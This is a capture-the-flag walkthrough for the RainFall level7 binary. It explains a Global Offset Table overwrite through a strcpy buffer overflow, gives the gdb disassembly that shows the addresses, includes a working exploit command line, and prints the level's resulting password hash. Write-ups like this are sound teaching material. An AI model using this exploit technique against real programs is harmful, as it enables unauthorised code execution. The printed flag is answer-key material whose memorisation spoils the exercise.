# Walkthrough

**Main** : 
The goal is to use a buffer overflow to overwrite the address of the `puts` function in the Global Offset Table with the address of the `m` function, so that when `put` function is called later, it will actually execute `m`

Overwriting the return address with the address of the `puts` function and then having the `puts` function execute the instructions of the `m` function, you achieve the desired outcome of calling the `m` function instead of `puts`.

We going use the first argument to exploit `strcpy`

**Process**:  
>   1. Find the offset
>   2. Get address of put
>     3. Get address of `m()`
>    4.  Load parameters
>    
### Source:
>[What is difference between Dynamic and Static librar](https://www.youtube.com/watch?v=eW5he5uFBNM)
>[ difference between Dynamic and Static librar](https://www.youtube.com/watch?v=Re5Z607jA0A)
>[GOT](https://www.youtube.com/watch?v=t1LH9D5cuK4&t=212s)
>[PLT and GOT](https://www.youtube.com/watch?v=NdlvRRUBG5Y&t=317s)
>[Got overwrite](https://infosecwriteups.com/got-overwrite-bb9ff5414628)
## Step 1

### Find the offset 

To the find the offset i used a  [Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) 
 1.   Offset of first  `strcpy()`  **20**  bytes
```
level7@RainFall:~$ ./level7 012345678901234567890 1234567 
Segmentation fault (core dumped)
```
## Step 2 
### Get address of `puts()`
 1. disassambly the main function got the the plt :
  
```
   0x080485f7 <+214>:	call   0x8048400 <puts@plt> <--- here
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave  
   0x08048602 <+225>:	ret    
End of assembler dump.
(gdb) disassemble 0x8048400
Dump of assembler code for function puts@plt: 
   0x08048400 <+0>:	jmp    *0x8049928 <--- GOT table
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
```

## Step 2 
### Get address of `m()`

```
(gdb) print &m
$1 = (<text variable, no debug info> *) 0x80484f4 <m>
```

## Step 3 

###  Load parameter

passe the pass as parameter
```
level7@RainFall:~$ ./level7 $(python -c 'print "\x90" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1693757825
```


